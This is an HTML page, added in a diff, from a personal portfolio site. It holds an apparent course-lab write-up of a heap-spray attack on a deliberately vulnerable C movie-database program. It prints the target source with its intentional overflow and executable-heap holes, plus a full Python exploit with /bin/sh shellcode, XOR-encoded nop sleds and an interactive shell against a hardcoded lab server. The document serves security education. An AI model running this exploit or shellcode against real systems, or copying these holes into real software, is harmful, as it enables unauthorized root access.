@@ -1,0 +1,474 @@
+<!DOCTYPE HTML>
+<!--
+	Landed by HTML5 UP
+	html5up.net | @n33co
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Eui Won Kim | Snowman</title>
+		<meta name="author" content="Eui Won Kim">
+		<meta charset="utf-8" />
+		<link rel="shortcut icon" href="images/logoblack.png" type="image/x-icon">
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
+		<link rel="stylesheet" href="assets/css/main.css" />
+	</head>
+	<body>
+		<div id="page-wrapper">
+
+			<!-- Header -->
+				<header id="header">
+					<h1 id="logo" style="margin-top: 5px"><a href="index.html"><img alt="" height="50px" src="images/johnekimlogo1.png" width="150px" /> </a></h1>			
+					<nav id="nav">
+						<ul>
+							<li><a href="about.html"><b>About</b></a></li>
+							<li>
+								<a href="#"><b>Projects</b></a>
+								<ul>
+									<li><a href="routie.html">Routie</a></li>
+									<li><a href="snowman.html">Study Buddy</a></li>
+									<li><a href="web.html">Personal Website</a></li>
+									<li><a href="elm.html">Elm</a></li>
+									<li><a href="cse.html">Lab Waitlist</a></li>
+									<li class="opener" style="-webkit-user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;">
+										<a href="#" style="display: block;">Internet Security</a>
+										<ul style="-webkit-user-select: none; position: absolute; z-index: 1001; left: -167px; top: 103.703125px; opacity: 1; display: none;" class="dropotron level-1">
+											<li style="white-space: nowrap;"><a href="buffer.html" style="display: block;">Buffer&Integer Overflow</a></li>
+											<li style="white-space: nowrap;"><a href="heap.html" style="display: block;">Heap Spray</a></li>
+											<li style="white-space: nowrap;"><a href="china.html" style="display: block;">China's Great Cannon</a></li>
+											<li style="white-space: nowrap;"><a href="worm.html" style="display: block;">XSS & Profile Worm</a></li>
+										</ul>
+									</li>
+									<li><a href="cse.html">Recommendation Algorithm</a></li>
+								</ul>
+							</li>
+							<li><a href="resume.html"><b>Resume</b></a></li>
+							<li><a href="contact.html"><b>Contact</b></a></li>
+							
+							
+						</ul>
+					</nav>
+				</header>
+
+			<!-- Main -->
+				<div id="main" class="wrapper style1">
+					<div class="container">
+						<header class="major">
+							<h2><a><img src="images/security.jpg" height="154px" width="178px" alt="" /></a>
+</h2>
+							<h2>Heap Spray.</h2>
+						</header>
+						
+							<p>Because of ASLR protection, I could not nail down where exactly I should put the SHELLCODE in. So I decided to use nop sled technique. <br><br>
+
+Also because cmdb_generate.c will scramble the raw string inputs into something else, I had to "\x90" * # of bytes it is assigned, then run gdb to get how it is XOR'ed. I got those values and used in sploit.py (e.g. writer":"\x7c\xbe\x0f\x3c"*75). After XOR with the key in cmdb_generate.c, it will turn out to be "\x90\x90\x90\x90"*75. There were some of the NL characters ('\x0a') in memory, and I had to convert it to "\x0f\x1f", which is equivalent to \x90 nop.<br><br>
+
+At the end of each index of ce_list, I inserted the SHELLCODE using the same technique above. Putting this for 4000 times in the memory gave me higher chance of succeeding the exploit.<br><br>
+
+cmdb.c's cmd_delete() had a bug where it creates a buf size of 500, but takes 5000 bytes as user input. Using this bug, I requested to delete "0x09090909", where the ce_list[0] is nearby (exact address starts from 0x0805d008 if no ASLR is used). After the return address is overwritten to be 0x09090909, it will execute instructions somewhere around the 0x09090909, and notice there is lots of nops. It will skip all the nops and finally meet SHELLCODE I put. Then it will gain the shell access.<br><br>
+
+After deleting, the script will call go_interactive() so I can interact with the shell. Then I used "cat key" after gaining root shell to retrieve the unique key.<br>
+key: a049456f66070dac7edb97944845cb9a9cd5a89f48dc0c5df53ae88676d2c201 </p>
+							<div class="row">
+								<div class="6u 12u(xsmall)" style="float: left;">
+								<header >
+									<h2><br></h2>
+									<p>Target</p>
+									<pre width="800px"><code >#include "cmdb.h"
+#include "generate_hash.h"
+#include <sys/mman.h>
+#include <errno.h>
+#include <string.h>
+
+void cmd_add();
+void cmd_review();
+void cmd_delete();
+void handle_commands();
+
+int main(int argc,char* argv[]){
+
+  // Fix stdout's behavior on non ttys
+  setbuf(stdout, NULL);
+
+  // Initialize the 'database'
+  ce_count = 0;
+
+  puts("Welcome to the CMDB (C Movie DataBase).\n");
+  printf("Generation ID: %s\n", cmdbgenhash);
+
+  handle_commands();
+}
+
+void handle_commands(){
+
+  char command[16];
+  
+  // Ask for commands and run them forever
+  while(1){
+    puts("Command?\na:Add Movie\nr:Review Movie\nd:Delete Movie\n");
+    get_line(command,16);
+    switch (command[0]){
+    case 'a': cmd_add(); break;
+    case 'r': cmd_review(); break;
+    case 'd': cmd_delete(); break;
+    default: puts("Invalid command\n");
+    }
+  }
+
+}
+
+void cmd_add(){
+  if(ce_count >= MAX_ENTRIES){
+    puts("Database is full. (Maybe delete some bad movies?)\n");
+    return;
+  }
+
+  struct cmdb_entry* ce = malloc(sizeof(struct cmdb_entry));
+  if(ce == NULL){
+    puts("Error allocating space for new entry. FATAL.\n");
+    exit(1);
+  }
+  // If we aren't full
+  new_entry(ce);
+  ce_list[ce_count] = ce;
+  ce_count +=1 ;
+
+  // Don't ever put this in your code unless you know what you are doing.
+  mprotect((void*)((int)ce&(1-getpagesize())),getpagesize()*2,PROT_READ|PROT_WRITE|PROT_EXEC);
+}
+
+void cmd_review(){
+  // Duplicate to let it have a new review
+
+  char name_buffer[500];
+  int i=0;
+  int found = 0;
+  struct cmdb_entry* ce = malloc(sizeof(struct cmdb_entry));
+  char tmp[3];
+  if(ce == NULL){
+    puts("Error allocating space for new entry. FATAL.\n");
+    exit(1);
+  }
+  puts("Review which movie?\n");
+  int r = get_line(name_buffer,300);
+  name_buffer[r] = '\0';
+
+  for(i=0;i<ce_count;i++){
+    if(memcmp(ce_list[i]->Title,name_buffer,strlen(name_buffer)) == 0){
+      found = 1;
+      break;
+    }
+  }
+  if(found == 0){
+    puts("Unable to find movie!\n");
+    return;
+  }
+
+  memcpy(ce,ce_list[i],sizeof(struct cmdb_entry));
+  ce_list[ce_count] = ce;
+  ce_count += 1;
+  puts("Rating? (out of 5 stars)\n");
+  get_line(tmp,3);
+  memcpy(&(ce->Average_Rating),tmp,3);
+  puts("Reviewed!\n");
+
+  // Don't ever put this in your code unless you know what you are doing.
+  mprotect((void*)((int)ce&(1-getpagesize())),getpagesize()*2,PROT_READ|PROT_WRITE|PROT_EXEC);
+}
+
+void cmd_delete(){
+
+  char name_buffer[500];
+
+  puts("Delete which movie?\n");
+
+  int r = get_line(name_buffer,5000);
+  name_buffer[r] = '\0';
+
+  // Find that movie and delete
+  int i=0;
+  int j=0;
+  int removed = 0;
+  for(i=0;i<ce_count;i++){
+    if(memcmp(ce_list[i]->Title,name_buffer,strlen(name_buffer)) == 0){
+      free(ce_list[i]);
+      for(j=i;j<ce_count-1;j++){
+	ce_list[j] = ce_list[j+1];
+      }
+      removed = 1;
+      ce_count--;
+      break;
+    }
+  }
+  if(removed){
+    puts("Removed movie!\n");
+  }
+  else{
+    puts("Unable to find movie!\n");
+  }
+
+}
+
+// Utility function, since c getline doesnt do what we want, and readline is big
+size_t get_line(char* buffer,size_t max){
+  char c;
+  size_t count = 0;
+  do{
+    c = getchar();
+    buffer[count] = c;
+    if( c == '\n'){
+      if( count > 0)
+	break;
+    }
+    else
+      count++;
+  }while(count < max);
+  return count;
+}
+
+
+									</code></pre>
+									</header>
+								</div>
+								<div class="6u 12u(xsmall)" style="float: right;">
+								<header >
+									<h2> <br></h2>
+									<p>Exploit</p>
+									<pre width="800px"><code >#!/usr/bin/python
+from sock import *
+import sys
+import time
+################################################################
+# Skeleton exploit for use                                     #
+# Uses a nice socket library (https://github.com/hellman/sock/)#
+# Actually read this and feel free to modify!                  #
+################################################################
+
+
+# Change this to the attack host to get your key
+HOST = "54.215.5.83"
+#HOST = "localhost"
+# This should be your port number
+PORT = "3038"
+
+# Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
+SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+shell = '\x0b\x6a\x99\x58\x68\x52\x2f\x2fhs\x2f\x68\x69\x62\x89\x6e\x31\xe3\xcd\xc9\x90\x80' 
+
+
+# XOR keys
+director =  "\x55\x8a\x55\xbe\x9d\xe3"
+star1 = "\xcb\xe9\xd7\xea\x02\xfa\x09\x3d\xdb\xe5\x53\xf7\xfc\x73\x9d\x6c\x96\x81\x05\xc1\x24\xb3\x98\x3d\xe5\xe2\xfa\x13\xf7\xd1\xa5\xea\x94\x9a\x03\xb1\xbd\x9c\xed\xb6\x91\x8b\xbd\x55\xcd\x64\xba\x7d\xc9\x69"
+star3 = "\x9c\xa8\x28\xe6\x88\x35\x05\x6b\x13\x9a\xf8\x6c\xe9\x0a\x00\xcf\xa2\x6f\x5b\xb1"
+summary = "\x02\xa6\x85\x53\x39\xa1\x95\x78\xda\xba\xb1\x1f\xd8\x3d\xed\x66\xa7\xc2\x7e\xab"
+country = "\x9a\x61\x8c\x97\xc1\x5e"
+budget = "\x93\xaa\xdf\x3f\x2d\x36\x96\x1b\x08\x6b\x39\x31\xa8\x4a\xea\x25\x70\xf8\x7a\xdd\x71\x47\x5d\xce\x94\xce\xde\xcc\x61\x12\xa8\xeb\x57\xc4\xc6\x01\xec\xcf\xb6\x48\xa4\x2a\x96\x33\x01\x3e\x0f\x11\x14\x55\xe5\xca\xde\x0c\x32\x27\x10\x08\x01\xaf\x10\xcc\x69\x8a\x0d\x51\xcf\xc0\xa9\x7d\xef\x16\x33\xb9\x95\x28\x22\xe9\x35\x76"
+opening = "\x3d\x83\x3c\x0a\x4e\x58\x57\xf8\x92\x51"
+rating = "\xfe\xa4\xe7"
+
+
+# A useful function to wait for the user to press enter, that way you can put in pause points easily
+def pause_script():
+    raw_input("Paused... Press enter to continue")
+
+def connect():
+    con = Sock(HOST+":"+PORT)
+    return con
+
+# This will clear the read buffer and print all of it
+def clear_read_buffer(con):
+    r = con.read_one(0)
+    while len(r) > 0:
+        print r
+        r = con.read_one(0)
+
+# This will remove a movie, and tell you success
+def remove_movie(title,con):
+    # Choose the remove option from the main menu
+    con.send_line("d")
+    
+    # Wait for a response
+    time.sleep(2)
+
+    # Clear out the read buffer
+    con.read_one(0)
+    
+    # Send the movie title
+    con.send_line(title)
+    
+    time.sleep(7)
+
+    pause_script()
+    go_interactive(con)
+    
+    # Wait for a response
+    time.sleep(2)
+
+    # Read the response
+    resp = con.read_line()
+
+    # Did we delete the movie?
+    return "Removed movie!" in resp
+
+# This will add a movie
+def send_movie(movie,con):
+    # Choose the add option
+    con.send_line("a")
+
+    # Send all the data in order
+    con.send_line(movie["title"])
+    con.send_line(movie["director"])
+    con.send_line(movie["writer"])
+    con.send_line(movie["star1"])
+    con.send_line(movie["star2"])
+    con.send_line(movie["star3"])
+    con.send_line(movie["star4"])
+    con.send_line(movie["star5"])
+    con.send_line(movie["summary"])
+    con.send_line(movie["country"])
+    con.send_line(movie["budget"])
+    con.send_line(movie["opening_weekend"])
+    con.send_line(movie["gross"])
+    con.send_line(movie["runtime"])
+    con.send_line(movie["aspect"])
+    con.send_line(movie["composer"])
+    con.send_line(movie["average_rating"])
+
+def send_sploit(movie):
+    con.send_line("a")
+
+    sploit = movie["title"]+ movie["director"] + movie["writer"] + movie["star1"] + movie["star2"] + movie["star3"] + movie["star4"] + movie["star5"] + movie["summary"] + movie["country"] +movie["budget"] + movie["opening_weekend"] + movie["gross"] + movie["runtime"] + movie["aspect"] + movie["composer"] + movie["average_rating"]
+
+    con.send_line(sploit)
+
+
+def xor(char, key):
+    #return char
+    #print fail
+    fieldLen = len(char)
+    keyLen = len(key)
+    if not ( fieldLen % keyLen == 0):
+        print "Error: key length does not divide field length."
+    else:
+        base=0
+        result = ""
+        answer = ""
+        #print char
+        for keyItr in range(fieldLen/keyLen):
+            base = keyItr*keyLen
+            for index in range(keyLen):
+                b = char[base+index]
+                a = key[index]
+                result = chr(ord(b) ^ ord(a))
+                answer = answer +result
+        return answer
+
+def movie():    
+    for i in range(3000):
+        print str(i)
+        send_sploit(hacker3)
+        time.sleep(0.02)
+        clear_read_buffer(con)
+
+
+
+# Switches to an interactive mode, good for shells maybe
+# You can't get out of interactive mode
+def go_interactive(con):
+    while True:
+        print "============= Interactice =============="
+        time.sleep(2)
+        print con.read_one(0)
+        con.write(sys.stdin.readline())
+
+def nop1(length):
+    return '\x90' * length
+
+def nop2(length):
+    return '\x80\x1c\xc4\x01' * (length/4)
+
+def nop3(length):
+    return '\x0f\x1f' *(length/2)
+
+def nop4(length):
+    return '\x31\xc0'*(length/2)
+
+hacker3 = {"title"          : nop1(500),
+          "director"        : xor(nop1(300), director ),
+          "writer"          : nop1(300),
+          "star1"           : xor(nop2(300), star1 ),
+          "star2"           : nop1(300),
+          "star3"           : xor(nop2(300), star3 ),
+          "star4"           : nop1(300),
+          "star5"           : nop1(300),
+          "summary"         : xor('\x90'*2000, summary ),
+          "country"         : xor(nop3(30), country),
+          "budget"          : xor('\x90'*80, budget),
+          "opening_weekend" : xor('\x90'*80, opening),
+          "gross"           : '\x90'*80,
+          "runtime"         : '\x90'*80,
+          "aspect"          : shell+'\x90'*18,
+          "composer"        : '\x90'*300,
+          "average_rating"  : xor(nop1(3), rating) }
+
+
+# Start the connection
+con = connect()
+
+
+# Pause the script until the user presses enter (useful for running under gdb and setting breakpoints)
+
+# Send the movie
+
+movie()
+
+# Delete the movie
+if remove_movie('\x09'*712,con):
+    print "Deleted!"
+else:
+    print "Didn't delete :("
+
+go_interactive(con)
+
+
+									</code></pre>
+								</div>
+								
+								
+						
+								
+						</div>
+
+					</div>
+				</div>
+				
+				
+
+			<!-- Footer -->
+				<footer id="footer">
+					<ul class="icons">
+						<li><a href="https://www.linkedin.com/in/euiwonkim" class="icon alt fa-linkedin"><span class="label">LinkedIn</span></a></li>
+						<li><a href="https://github.com/jeo1kim" class="icon alt fa-github"><span class="label">GitHub</span></a></li>
+						<li><a href="mailto:jeo1kim@gmail.com" class="icon alt fa-envelope"><span class="label">Email</span></a></li>
+					</ul>
+					<ul class="copyright">
+						<li>&copy; Awesome Possom. All rights reserved.</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+						<li>Logo: <a href="Cargocollective.com/alicesung">Alice Sung Kim</a></ul>					</ul>
+				</footer>
+
+		</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/jquery.dropotron.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/skel.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
